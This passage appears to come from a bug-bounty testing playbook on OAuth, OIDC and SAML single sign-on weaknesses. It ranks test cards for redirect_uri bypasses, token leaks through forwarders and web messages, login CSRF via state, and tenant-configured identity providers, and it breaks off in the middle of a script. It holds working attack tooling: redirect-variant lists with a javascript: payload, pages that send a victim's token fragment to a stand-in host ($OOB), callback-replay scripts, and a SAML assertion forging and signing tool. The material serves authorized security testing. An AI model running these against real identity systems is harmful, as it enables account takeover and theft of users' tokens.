# OAU · OAuth, OIDC, SAML & SSO

> Single sign-on hands the user's identity from an identity provider to the application through redirects,
> one-time codes, tokens and signed assertions, and each step has one check that is easy to leave out: the
> redirect target, the state, the code's single use, the token's audience, the assertion's signature. One
> missing check is account takeover of every user who signs in that way and pays high to critical. Login CSRF,
> missing PKCE without a leak, and clickjacking on the consent page are low or excluded.

| | |
|---|---|
| **Class** | `oauth` |
| **Applies when** | http, app\|api, oauth-login\|oauth-provider\|saml |
| **Pays** | 87 disclosed reports filed under the class and 77 more that touch it; 18 paid, median $1,000, top $10,500. The best-paid ones signed the attacker in as someone else at the hand-off: a SAML check bypassed (#223014, $8,500), an SSO token or code delivered to the wrong place (#265943, $7,500; #1861974, $2,000), an e-mail address the identity provider never verified (#922456, $3,000). |
| **Weaknesses** | Improper Authentication - Generic · CWE-287 · Cross-Site Request Forgery (CSRF) · CWE-352 · Improper Verification of Cryptographic Signature · CWE-347 · Authentication Bypass by Capture-replay · CWE-294 · Insufficiently Protected Credentials · CWE-522 · Improper Authorization · CWE-285 · Server-Side Request Forgery (SSRF) · CWE-918 |

## Why it pays

A login through an identity provider replaces one password check with a chain of values that pass through the
victim's browser: a redirect target, a `state`, a code, a token, a SAML response. The application must check
each of them, and the checks fail in a few repeatable ways. The provider compares `redirect_uri` by prefix or
pattern (#1861974, #3955956). The registered redirect space contains an open redirect that carries the code
on (#3423013, #202781). The callback skips `state` (#1878381, #2688). A code redeems twice (#3734676). The
application trusts an e-mail address the provider never verified (#922456, #235139, #1593404). The SAML
service provider signs in a user that no valid signature from the identity provider covers (#223014, #2579939,
#3827674).

Most paid reports are configuration on the programme's side, not bugs inside Google, Apple, Microsoft or Okta:
the programme registered a broad redirect URI, left out `state`, or matched users by e-mail. Bugs in the
third-party provider itself are `third-party`. The top report in the class, #976603 ($10,500), is titled as a
denial of service against any organisation's SSO that opened account takeovers: when tenants can configure
their own SSO, that configuration is attack surface too. The payout follows the victim's effort: takeover of
any user with no click is critical, takeover after one click on a link is high, login CSRF is low.

## The crux question

**Which value in this hand-off identifies the user, who produced it, and what stops the application from
accepting one that was produced for someone else, for another client, or for an earlier login?**

## Applicability probe

Settle `oauth-login`, `oauth-provider` and `saml` for the asset.

```bash
# 1. An authorization server on this host: discovery documents and the endpoints they name
for p in /.well-known/openid-configuration /.well-known/oauth-authorization-server /oauth/.well-known/openid-configuration; do
  curl -sS "${HDR[@]}" -o "$E/recon/$H/disc$(echo "$p" | tr / _).json" -w "%{http_code} %{content_type} $p\n" "$T$p"; done
python3 - "$E/recon/$H"/disc_.well-known_openid-configuration.json <<'PY'
import json, sys
try:
    d = json.load(open(sys.argv[1]))
except ValueError:
    sys.exit('no JSON document at /.well-known/openid-configuration')
for k in ('issuer', 'authorization_endpoint', 'token_endpoint', 'userinfo_endpoint', 'introspection_endpoint', 'jwks_uri',
          'registration_endpoint', 'response_types_supported', 'response_modes_supported', 'code_challenge_methods_supported',
          'prompt_values_supported', 'request_uri_parameter_supported', 'require_request_uri_registration'):
    print(k, '=', d.get(k))
PY
# 2. Client side: the authorize URLs the login buttons and bundles build, and the OAuth/SAML parameters in the crawl
curl -sS "${HDR[@]}" "$T/login" | grep -oiE 'href="[^"]*(oauth|authorize|sso|saml|openid|connect)[^"]*"' | sort -u
grep -rhoE "https://[A-Za-z0-9.-]+/[A-Za-z0-9/._-]*(authorize|oauth2?/auth|saml2?|sso)[A-Za-z0-9/._-]*" "$E/recon/$H/js/" | sort -u
grep -rhoE "(client_?id|redirect_?uri|response_type|SAMLRequest|SAMLResponse|RelayState)[\"'=: ]+[^\"'& ]{3,}" "$E/recon/$H/" \
  | sort | uniq -c | sort -rn | head -20
# 3. SAML service-provider metadata (it names the assertion consumer service)
for p in /saml/metadata /saml2/metadata /sso/saml/metadata /Shibboleth.sso/Metadata /auth/saml/metadata; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} $p\n" "$T$p"; done
```

```bash
scripts/sane fact set "$H" oauth-login=1 --ev "'Sign in with Google' and 'with GitHub'; redirect_uri=$T/auth/google/callback; state present"
scripts/sane fact set "$H" oauth-provider=1 --ev "openid-configuration lists authorization, token and registration endpoints; developer settings create apps"
scripts/sane fact set "$H" saml=1 --ev "organisation settings offer SAML SSO; ACS at /saml/acs; SP metadata at /saml/metadata"
# nothing found:
scripts/sane fact set "$H" oauth-login=0 oauth-provider=0 saml=0 --ev "password login only; no discovery document; no SSO setting on any plan shown"
```

Set `oauth-provider` on the host that serves the authorization endpoint when it belongs to the programme: a
first-party identity host, the programme's tenant on a hosted identity service under its own domain, or a
custom SSO hand-off that appends a login token to a return URL. Set it also on an API host that accepts the
provider's third-party tokens. A client of Google, Apple, Microsoft or GitHub is `oauth-login` only. Record each
flow in `$E/evidence/$H/oauth-flows.md`: provider, client id, registered `redirect_uri`, `response_type`,
whether `state`, `nonce` and PKCE are sent, where the session is created, the link and unlink routes, whether
we can register our own client, and whether tenants can configure their own SSO. With all three facts false the
chapter closes for the asset.

## Triage order

OAU-008 (client secrets and identity-provider keys shipped to the browser: no account, a few greps) → OAU-004 (is
`state` bound to the browser: one capture, one replay) → OAU-001 (`redirect_uri` at the provider) → OAU-002
(forwarders in the registered redirect space) → OAU-003 (token in the fragment or a message) → OAU-009 (what the
sign-in endpoint accepts as the provider's token) → OAU-007 (sign-in matched by an e-mail the provider never
verified) → OAU-015 (the provider asserting addresses nobody proved) → OAU-013 (a SAML response the identity
provider never signed: no account needed) → OAU-014 (a signed SAML response wrapped, split or replayed) → OAU-006
(code redemption and PKCE) → OAU-012 (consent) → OAU-010 (scope) → OAU-011 (fetches made for client registration)
→ OAU-005 (a tenant's own identity provider: the highest ceiling and the most set-up).

## Items

### OAU-001 · The authorization server issues a code or token to a redirect_uri the client never registered

| | |
|---|---|
| **Severity** | Critical when a signed-in user's code or token reaches a host we control after one click and no consent screen; High when the victim must also approve a consent screen |
| **Requires** | oauth-provider, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #1861974, #3955956, #861940, #2575 |

- **Where:** the `authorization_endpoint` from the discovery document, and the provider's own login hand-offs
  that append a token to a return URL (`/sso?return_to=`, `/login?continue=`, `/session/handoff?next=`). Use
  every client id we can see: the programme's first-party clients (in the login buttons and bundles of its
  other hosts) and a client we registered ourselves in the developer settings. Note the exact registered
  `redirect_uri` of each. `$A` must carry A's session on the provider's host.
- **Test:** the provider must compare the requested `redirect_uri` with the registered value exactly. Prefix,
  substring and pattern checks, and a validator that parses the URL differently from the code that builds the
  redirect, let a value that names another host through. Signed in as A, request a code with each variant and
  read where the 302 sends it; nothing needs to be followed. A 200 consent page whose form posts to a foreign
  host is also a hit: approve it for A and read the form's action.
- **How:**
  ```bash
  AZ='<authorization_endpoint>'; CID='<client_id>'; RU='<registered redirect_uri>'; D="$E/evidence/$H/OAU-001"; mkdir -p "$D"
  W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); RH=$(python3 -c 'import sys,urllib.parse as u;print(u.urlsplit(sys.argv[1]).hostname)' "$RU")
  cat > "$D/variants.txt" <<EOF
  $RU
  https://$OOB/oau001
  https://$RH.$OOB/oau001
  https://$RH@$OOB/oau001
  https://$RH:443@$OOB/oau001
  https://$OOB\\@$RH/oau001
  https://$OOB#@$RH/oau001
  https://$OOB?.$RH/oau001
  https://$OOB/$RH/oau001
  https://oau001.$RH/
  ${RU%/}/../../oau001
  ${RU}%2f..%2f..%2foau001
  http://${RU#https://}
  javascript:alert(document.domain)//$RH
  EOF
  while read -r V; do
    curl -sS "${HDR[@]}" $A -o /dev/null -w "%{http_code} %{redirect_url}  <=  $V\n" --get "$AZ" --data-urlencode "client_id=$CID" \
      --data-urlencode response_type=code --data-urlencode scope=openid --data-urlencode state=oau001 --data-urlencode "redirect_uri=$V"
    sleep "$W"; done < "$D/variants.txt" | tee "$D/results.txt"
  # parameter pollution: the validator reads one copy, the redirect is built from the other
  curl -sS "${HDR[@]}" $A -o /dev/null -w '%{http_code} %{redirect_url}\n' --get "$AZ" --data-urlencode "client_id=$CID" \
    --data-urlencode response_type=code --data-urlencode "redirect_uri=$RU" --data-urlencode "redirect_uri=https://$OOB/oau001"
  ```
- **Proof:** the provider's 302 with `Location: https://<host we control>/...?code=` (or `#access_token=`) for
  account A, saved with `-D-`, then the code used: opened on the client's own callback in a clean browser
  profile it gives A's session, or our own client redeems it at the token endpoint. For a first-party client, A
  stands in for the victim.
- **Not a finding when:** the provider stops at its own error page, or returns `error=invalid_request` to the
  registered URI. The variant is accepted but the token endpoint refuses the code because the `redirect_uri`
  at redemption differs (RFC 6749 §4.1.3 binding): check that with OAU-006 before writing anything. The only
  accepted host is a look-alike we would have to register; do not register domains that imitate the target.
  `http://localhost` or `127.0.0.1` with any port is accepted for a native client: RFC 8252 allows loopback
  redirects. The provider is a third party validating someone else's client (`third-party`).
- **Escalate:** a `javascript:` value that ends up as a link on the provider's page is XSS-004 on the
  provider's origin (#392106). An accepted sub-domain wildcard plus a dangling sub-domain is the STO chain. Ask
  for `response_type=token` with the accepted value (OAU-003): the token arrives directly and needs no
  redemption. Acceptance limited to other paths or query strings on the registered host goes to OAU-002.

### OAU-002 · A page inside the client's registered redirect space forwards the code to a host we control

| | |
|---|---|
| **Severity** | High standalone when the forwarded code logs us in as the victim after one click; Critical when no consent click is needed either; Medium when the code arrives already spent (needs OAU-006) |
| **Requires** | oauth-login\|oauth-provider, account, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #3423013, #202781, #665651, #342709 |

- **Where:** the redirect space the provider accepts for the client: other paths and query strings on the
  registered host, and sub-domains when a wildcard is registered. Inside it: open redirects (`/logout?next=`,
  `/out?url=`, `/r/<url>`, `/goto?to=`), pages that render content we control (a profile, a post, an uploaded
  image, a link preview), pages that link out or load resources under a weakened referrer policy. On an
  `oauth-login` asset the provider may be Google or Facebook: reading which values it accepts for the
  programme's client id observes the programme's own registration and attacks nobody else. RDR-008 runs the
  same chain from the client's sign-in button: when it has run on this deployment, reuse its `accepted.txt` and
  forwarder list, mark both cards from one test, and report one root cause once.
- **Test:** the provider sends the code to a URL inside the registered space, and the page at that URL hands its
  own URL on. A path-based redirector usually keeps the query string and a parameter-based one usually drops it,
  so try `/r/https://$OOB/` before `?next=`. The code arrives unspent, because the client's callback never ran.
  For a page with our content, an image on `$OOB` receives the full URL in `Referer` only when the page weakens
  the browser default (`unsafe-url`, `no-referrer-when-downgrade`).
- **How:**
  ```bash
  AZ='<authorization endpoint the client uses>'; CID='<client_id>'; RU='<registered redirect_uri>'; D="$E/evidence/$H/OAU-002"; mkdir -p "$D"
  RB=$(python3 -c 'import sys,urllib.parse as u;s=u.urlsplit(sys.argv[1]);print(s.scheme+"://"+s.netloc)' "$RU"); W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  az(){ curl -sS "${HDR[@]}" $A "$@" --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
    --data-urlencode scope=openid --data-urlencode state=oau002 --data-urlencode "redirect_uri=$V"; }
  # 1. how far the accepted space reaches (A signed in at the provider)
  for V in "$RU/oau002" "$RU?oau002=1" "$RB/oau002-other-path" "$RB/"; do
    az -o /dev/null -w "%{http_code} %{redirect_url}  <=  $V\n"; sleep "$W"; done | tee "$D/space.txt"
  # 2. forwarders inside that space, tested without OAuth: does a code-shaped parameter reach our host?
  for F in "$RB/r/https://$OOB/oau002?code=oau002marker" "$RB/logout?next=https://$OOB/oau002&code=oau002marker" \
           "$RB/out?url=https://$OOB/oau002&code=oau002marker"; do
    curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{redirect_url}  <=  $F\n" "$F"; sleep "$W"; done | tee "$D/forwarders.txt"
  # 3. the chain: A's code goes to the forwarder, the forwarder sends it to $OOB
  V="$RB/r/https://$OOB/oau002"; az -L --max-redirs 5 -o /dev/null -w '%{url_effective}\n'
  ```
  For a page with our content, open the authorize URL with that page as `redirect_uri` in the scriptable
  browser and read the `Referer` our image request carried in the `$OOB` log.
- **Proof:** the `$OOB` log line for `/oau002` carrying A's `code=`, the provider's 302 to the forwarder and the
  forwarder's 302 to us (raw), and the code then used on the client's own callback in a clean browser profile
  giving A's session. The victim's part is one click on the authorize link while signed in at the provider.
- **Not a finding when:** every variant outside the exact registered value is refused, so the forwarder is a
  plain open redirect (`open-redirect`, RDR chapter). The forwarder drops the query and the code stays on the
  target's host. The code reaches us only after the client spent it (a Referer from the page after login): it
  matters only with OAU-006 or the token flow of OAU-003. The Referer carries the origin alone, the default
  `strict-origin-when-cross-origin`. A passive leak from the normal callback page to an analytics vendor is
  INF-011.
- **Escalate:** OAU-003: with `response_type=token` the token rides in the fragment, which the browser keeps
  across every redirect, so a forwarder that drops the query works too. OAU-006 and OAU-008: a leaked code is
  redeemed without the client when the client is public or its secret is exposed.

### OAU-003 · Changing response_type or response_mode delivers a live token to a page we control

| | |
|---|---|
| **Severity** | High standalone when the victim's token or unspent code reaches a page we control; Critical when no consent click is needed; None when the switch works but nothing leaves the client's origin |
| **Requires** | oauth-login\|oauth-provider, account, oob, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #3596, #826394, #875938, #138270 |

- **Where:** `response_types_supported` and `response_modes_supported` in the discovery document, the authorize
  URL the client builds, the callback page's JavaScript (what it does with `location.hash`, relays to
  `window.opener`), popup login variants (`display=popup`, `/oauth/relay`, `/callback.html`, `xd_receiver`),
  and pages in the redirect space with message listeners. Endpoints that return the current user's token as
  script (a JSONP `callback=` or a `.js` URL) are the same leak by inclusion (#138270).
- **Test:** the client expects a code in the query, but the provider often issues `token` or `id_token` to the
  same client, in the fragment, a self-posting form or a web message. Browsers re-attach a fragment to every
  redirect target, so the OAU-002 forwarders that drop the query still deliver it. An unexpected response type
  also makes the client's page fail before it consumes the value, which leaves the value in the URL for any
  script that reads `location` (the "dirty dancing" pattern). A relay that posts to `*` hands the value to
  whichever page opened the window.
- **How:**
  ```bash
  AZ='<authorization endpoint>'; CID='<client_id>'; RU='<registered redirect_uri, or the forwarder from OAU-002>'
  D="$E/evidence/$H/OAU-003"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. which combinations the provider grants this client (A signed in at the provider)
  for RT in code token 'id_token token' 'code token' 'code id_token'; do for RM in '' query fragment form_post web_message; do
    curl -sS "${HDR[@]}" $A -o "$D/body.$RANDOM" -w "%{http_code} rt=[$RT] rm=[$RM] %{redirect_url}\n" --get "$AZ" \
      --data-urlencode "client_id=$CID" --data-urlencode "response_type=$RT" ${RM:+--data-urlencode "response_mode=$RM"} \
      --data-urlencode "redirect_uri=$RU" --data-urlencode scope=openid --data-urlencode state=oau003 --data-urlencode nonce=oau003n
    sleep "$W"; done; done | tee "$D/modes.txt"
  grep -lE 'access_token|id_token' "$D"/body.*; grep -hoE "postMessage\([^)]{0,120}" "$D"/body.* | sort -u
  ```
  ```html
  <!-- https://$OOB/oau003.html : landing page for the forwarder; sends the fragment to our own log -->
  <script>fetch('/log?h=' + encodeURIComponent(location.hash.slice(1)), {mode: 'no-cors'})</script>
  <!-- https://$OOB/oau003-opener.html : opens the flow and logs whatever the window posts back -->
  <script>
  onmessage = e => fetch('/log?o=' + encodeURIComponent(e.origin) + '&d=' + encodeURIComponent(JSON.stringify(e.data)), {mode: 'no-cors'});
  open('<authorize URL with response_type=token and response_mode=web_message, display=popup, or the relay page as redirect_uri>');
  </script>
  ```
  Open each page in the scriptable browser signed in at the provider as A, then read the `$OOB` access log.
- **Proof:** the `$OOB` log line carrying A's `access_token` (or the unspent code), the browser's navigation
  chain saved as a HAR, and exactly one read-only call with that token to the provider's `userinfo` or the
  asset's `/api/me` naming A.
- **Not a finding when:** the provider refuses the combination for this client (`unsupported_response_type`,
  `unauthorized_client`). The token lands only on the client's own origin and no forwarder, relay or script
  hands it on. The relay checks `event.origin` or posts to the registered origin only. A `form_post` response
  posts back to the registered URI, which only the client controls.
- **Escalate:** the token's scopes decide the impact (OAU-010). A listener that also writes the data into the
  page is XSS-014. With no forwarder, a third-party script on the callback page that reads `location` is
  INF-011.

### OAU-004 · The sign-in callback completes an authorization that another browser started, because `state` is missing, constant or not bound to the session

| | |
|---|---|
| **Severity** | Low standalone (login CSRF: the victim's browser works inside our account); Medium with a self-XSS in our account or a flow in which the victim saves something private into it; High when the same callback, reached while the victim is signed in, links our identity to the victim's account (CSR-009) |
| **Requires** | oauth-login, account, browser |
| **Excluded by** | csrf-low |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #1878381, #2688, #152586, #2228 |

- **Where:** each "Sign in with ..." button and the callback it returns to: `/auth/<provider>/callback` (OmniAuth,
  Passport), `/accounts/<provider>/login/callback/` (django-allauth), `/login/oauth2/code/<id>` (Spring Security),
  `/signin-oidc` (ASP.NET), `/api/auth/callback/<provider>` (NextAuth), `/oauth2/callback`. The 302 from the
  button shows what the client sends to the provider: `state`, `nonce`, `code_challenge`. A is our identity at the
  provider; the victim is a fresh browser profile.
- **Test:** the client must accept a callback only in the browser that started the flow: `state` equal to a value
  kept in that browser's session or cookie, or a PKCE verifier or nonce kept the same way. Start the flow as A,
  finish the provider step, and stop before A's browser loads the callback, so the code stays unspent. Then make a
  fresh browser load that callback from another origin. If it ends up signed in as A, nothing binds the response to
  the browser. A missing `state`, one that never changes, one checked only when present, and one compared with
  nothing the victim's browser holds all fail the same way.
- **How:**
  ```bash
  LB="$T/auth/google"; CB='/auth/google/callback'     # the URL behind a "Sign in with" button, and the path of the callback it returns to
  ME="$T/api/me"; D="$E/evidence/$H/OAU-004"; mkdir -p "$D"
  # 1. what each start sends: two starts from two empty jars; state absent, repeated or not tied to a cookie is the first signal
  for i in 1 2; do curl -sS "${HDR[@]}" -c "$D/start$i.jar" -o /dev/null -w '%header{location}\n' "$LB"; sleep 1; done | tee "$D/starts.txt" \
    | python3 -c 'import sys, urllib.parse as u
  for l in sys.stdin: q = dict(u.parse_qsl(u.urlsplit(l.strip()).query)); print({k: q.get(k) for k in ("state", "nonce", "code_challenge", "redirect_uri")})'
  awk -F'\t' 'NF >= 7 {print FILENAME ": " $6 " = " $7}' "$D"/start*.jar     # the pre-login cookies a binding could live in
  # 2. as A in the scriptable browser: start, sign in at the provider, and stop before the callback loads
  cat > "$D/capture.py" <<'PY'
  # capture.py <start url> <callback path> <out file>: sign in as A in the window; the callback request is aborted and saved, unspent
  import sys
  from playwright.sync_api import sync_playwright
  start, path, out = sys.argv[1:4]; got = []
  def grab(route):
      r = route.request; got.append(f'{r.method} {r.url}\n{r.post_data or ""}'); route.abort()
  with sync_playwright() as p:
      b = p.chromium.launch(headless=False); c = b.new_context()
      c.route(lambda url: path in url.split('?')[0], grab)
      pg = c.new_page(); pg.goto(start)
      for _ in range(300):
          if got: break
          pg.wait_for_timeout(1000)
      open(out, 'w').write(got[0] if got else ''); b.close()
  PY
  python3 "$D/capture.py" "$LB" "$CB" "$D/callback.txt"; sed -E 's/(code=)[^&]*/\1<redacted>/' "$D/callback.txt"
  # 3. the victim: a fresh profile is sent to the captured callback from another origin, then the target is asked who it is
  cat > "$D/victim.py" <<'PY'
  # victim.py <capture file> <me url> <evidence dir>: replays the callback as a navigation (GET) or a self-posting form (form_post)
  import html, json, sys, urllib.parse as u
  from playwright.sync_api import sync_playwright
  cap, me, d = sys.argv[1:4]; head, _, body = open(cap).read().partition('\n'); method, url = head.split(' ', 1)
  fields = ''.join('<input type="hidden" name="%s" value="%s">' % (html.escape(k), html.escape(v)) for k, v in u.parse_qsl(body))
  page = ('<form method="POST" action="%s">%s</form><script>document.forms[0].submit()</script>' % (html.escape(url), fields)
          if method == 'POST' else '<script>location = %s</script>' % json.dumps(url))
  with sync_playwright() as p:
      b = p.chromium.launch(); pg = b.new_context().new_page()
      try: pg.set_content(page)
      except Exception as e: print('navigated away:', str(e)[:80])
      pg.wait_for_timeout(8000); print(pg.url)
      print(pg.evaluate('u => fetch(u, {credentials: "include"}).then(r => r.text()).catch(e => String(e))', me)[:300])
      pg.screenshot(path=d + '/victim.png'); b.close()
  PY
  python3 "$D/victim.py" "$D/callback.txt" "$ME" "$D"
  # 4. refused in step 3: one more capture, delivered without state (some callbacks check it only when it is present)
  python3 "$D/capture.py" "$LB" "$CB" "$D/callback2.txt"
  python3 - "$D/callback2.txt" <<'PY'
  import sys, urllib.parse as u
  f = sys.argv[1]; head, _, body = open(f).read().partition('\n'); m, url = head.split(' ', 1); s = u.urlsplit(url)
  drop = lambda qs: u.urlencode([(k, v) for k, v in u.parse_qsl(qs, keep_blank_values=True) if k != 'state'])
  open(f, 'w').write(f'{m} {u.urlunsplit(s._replace(query=drop(s.query)))}\n{drop(body)}')
  PY
  python3 "$D/victim.py" "$D/callback2.txt" "$ME" "$D"
  ```
- **Proof:** `victim.png` and the identity call in the fresh browser naming A after it loaded only our page;
  `starts.txt` showing `state` absent, repeated or not tied to a pre-login cookie; the callback URL with the code
  redacted. Report login CSRF alone only where the policy pays it; otherwise park it with the chain partner in the
  note.
- **Not a finding when:** the callback answers with a state error or restarts the flow: the binding holds (a
  cookie, the session, or a PKCE verifier kept server-side); write which one. The capture was already spent (A's
  browser loaded the callback before the abort, or the provider refuses a code shown twice): capture again. The
  target asks the victim to confirm "Continue as A?" before it creates the session. The programme excludes login
  CSRF (`csrf-low`). A SAML response sent by the identity provider without a request is unsolicited by design:
  OAU-014.
- **Escalate:** run a fresh capture against a victim browser signed in as B (CSR-009, step 3): a callback that
  links the identity instead of switching sessions lets A sign in to B's account with "Sign in with": High, one
  report for both cards. A self-XSS in A's account now runs in the victim's browser (CSR-010, XSS chapter). A
  victim who saves a card, uploads a file or connects an integration inside A's account hands it to A: show it
  with a harmless marker on our own accounts. A `state` compared only with a cookie can be planted by a sibling host
  that sets parent-domain cookies (CSR-011, AUT-016).

### OAU-005 · An identity provider that one tenant configures signs in accounts outside that tenant

| | |
|---|---|
| **Severity** | Critical standalone when our tenant's identity provider opens an existing account of another tenant or a personal account, with no action by its owner; High when it only provisions addresses outside the tenant's verified domains, or a claimed domain routes that domain's SSO sign-ins to our identity provider |
| **Requires** | multi-tenant, saml\|oauth-login, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #976603, #2101076, #438306, #1049375 |

- **Where:** the organisation or workspace security settings that let a tenant admin connect its own SAML or OIDC
  identity provider (often an enterprise plan or trial; note the plan in the evidence), the domain settings that
  go with them ("verify your domain", "enforce SSO for @domain"), just-in-time provisioning toggles, the per-tenant
  ACS URL and SP entityID shown there, and the "Sign in with SSO" page that asks for an e-mail or an organisation
  name and routes to an identity provider. A is admin of tenant A; B is our account in tenant B, or a personal
  account, with an address on a domain of ours.
- **Test:** an identity provider configured by tenant A has authority over tenant A's users and over the domains
  tenant A has proved, nothing else. The SP must refuse, or keep inside tenant A, any identity A's provider asserts
  beyond that. Connect tenant A to an identity provider we run (for SAML, a key pair: the SP never contacts the
  identity provider, the browser carries the response), then assert B's address, and an address on a domain of
  ours that no tenant has proved. Watch for a session in B's existing account, for B's account being attached to
  tenant A, and for a domain added to tenant A that starts routing SSO before its proof is done. Only domains we
  own: claiming a real company's domain would affect its real users.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-005"; mkdir -p "$D" "$E/tools"; ME="$T/api/me"
  ACS='<tenant A ACS URL from its SSO settings>'; SPID='<the SP entityID (Audience) shown there>'; IDP="https://$OOB/oau005-idp"
  START='<the SP-initiated sign-in for tenant A, e.g. $T/sso/<A slug>; empty if the SP accepts IdP-initiated responses>'
  # 0. our identity provider is a key pair: enter $IDP as its entityID, https://$OOB/oau005-sso as its sign-in URL and oau005.crt in tenant A
  openssl req -x509 -newkey rsa:2048 -nodes -days 30 -subj '/CN=oau005-idp' -keyout "$D/oau005.key" -out "$D/oau005.crt" 2>/dev/null
  [ -s "$E/tools/saml-forge.py" ] || cat > "$E/tools/saml-forge.py" <<'PY'
  # saml-forge.py ACS SP_ENTITY_ID IDP_ENTITY_ID NAMEID [KEY.pem CERT.pem]: print a base64 SAMLResponse whose assertion
  # names NAMEID (also sent as email, mail and the WS-Fed emailaddress attribute). With KEY and CERT it is signed
  # (RSA-SHA256, exclusive c14n). Env: SAML_SIGN=assertion|response|both (default assertion), SAML_KEYINFO=0 to leave
  # the certificate out, SAML_IRT=<AuthnRequest ID> for InResponseTo, SAML_MIN=<minutes valid> (default 5).
  import base64, datetime as dt, hashlib, os, sys, uuid
  from lxml import etree
  from cryptography import x509
  from cryptography.hazmat.primitives import hashes, serialization
  from cryptography.hazmat.primitives.asymmetric import padding
  acs, sp, idp, who, *kc = sys.argv[1:]
  P, A, DS = ('urn:oasis:names:tc:SAML:2.0:protocol', 'urn:oasis:names:tc:SAML:2.0:assertion', 'http://www.w3.org/2000/09/xmldsig#')
  now = dt.datetime.now(dt.timezone.utc).replace(microsecond=0, tzinfo=None); ts = lambda t: t.isoformat() + 'Z'
  end = ts(now + dt.timedelta(minutes=int(os.environ.get('SAML_MIN', '5')))); rid, aid = '_' + uuid.uuid4().hex, '_' + uuid.uuid4().hex
  irt = f' InResponseTo="{os.environ["SAML_IRT"]}"' if os.environ.get('SAML_IRT') else ''
  attrs = ''.join(f'<saml:Attribute Name="{n}"><saml:AttributeValue>{who}</saml:AttributeValue></saml:Attribute>' for n in
                  ('email', 'mail', 'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress'))
  doc = etree.fromstring(f'''<samlp:Response xmlns:samlp="{P}" xmlns:saml="{A}" ID="{rid}" Version="2.0" IssueInstant="{ts(now)}" Destination="{acs}"{irt}>
  <saml:Issuer>{idp}</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="{aid}" Version="2.0" IssueInstant="{ts(now)}"><saml:Issuer>{idp}</saml:Issuer>
  <saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{who}</saml:NameID>
  <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="{end}" Recipient="{acs}"{irt}/></saml:SubjectConfirmation></saml:Subject>
  <saml:Conditions NotBefore="{ts(now - dt.timedelta(minutes=2))}" NotOnOrAfter="{end}"><saml:AudienceRestriction><saml:Audience>{sp}</saml:Audience></saml:AudienceRestriction></saml:Conditions>
  <saml:AuthnStatement AuthnInstant="{ts(now)}" SessionIndex="{aid}"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>
  <saml:AttributeStatement>{attrs}</saml:AttributeStatement></saml:Assertion></samlp:Response>''')
  def sign(el):            # enveloped signature placed after the element's Issuer, as the SAML schema orders it
      key = serialization.load_pem_private_key(open(kc[0], 'rb').read(), None)
      der = x509.load_pem_x509_certificate(open(kc[1], 'rb').read()).public_bytes(serialization.Encoding.DER)
      c14n = lambda e: etree.tostring(e, method='c14n', exclusive=True, with_comments=False)
      dig = base64.b64encode(hashlib.sha256(c14n(el)).digest()).decode()
      ki = '' if os.environ.get('SAML_KEYINFO') == '0' else f'<ds:KeyInfo><ds:X509Data><ds:X509Certificate>{base64.b64encode(der).decode()}</ds:X509Certificate></ds:X509Data></ds:KeyInfo>'
      s = etree.fromstring(f'''<ds:Signature xmlns:ds="{DS}"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
  <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#{el.get('ID')}"><ds:Transforms>
  <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>
  <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>{dig}</ds:DigestValue></ds:Reference></ds:SignedInfo>
  <ds:SignatureValue/>{ki}</ds:Signature>''')
      el.find(f'{{{A}}}Issuer').addnext(s)
      si = s.find(f'{{{DS}}}SignedInfo')
      s.find(f'{{{DS}}}SignatureValue').text = base64.b64encode(key.sign(c14n(si), padding.PKCS1v15(), hashes.SHA256())).decode()
  mode = os.environ.get('SAML_SIGN', 'assertion')
  if kc and mode in ('assertion', 'both'): sign(doc.find(f'{{{A}}}Assertion'))
  if kc and mode in ('response', 'both'): sign(doc)
  print(base64.b64encode(etree.tostring(doc)).decode())
  PY
  sso(){ # sso <identity>: start at the SP (InResponseTo from its AuthnRequest), post our signed response for <identity>, ask who we are
    J="$D/$(printf %s "$1" | md5sum | cut -c1-8).jar"; rm -f "$J"; IRT=
    if [ -n "$START" ]; then L=$(curl -sS "${HDR[@]}" -c "$J" -o /dev/null -w '%header{location}' "$START")
      IRT=$(python3 -c 'import sys, zlib, base64, re, urllib.parse as u
  q = dict(u.parse_qsl(u.urlsplit(sys.argv[1]).query)); x = zlib.decompress(base64.b64decode(q["SAMLRequest"]), -15).decode()
  print(re.search(r"\sID=\"([^\"]+)\"", x).group(1))' "$L" 2>/dev/null); fi
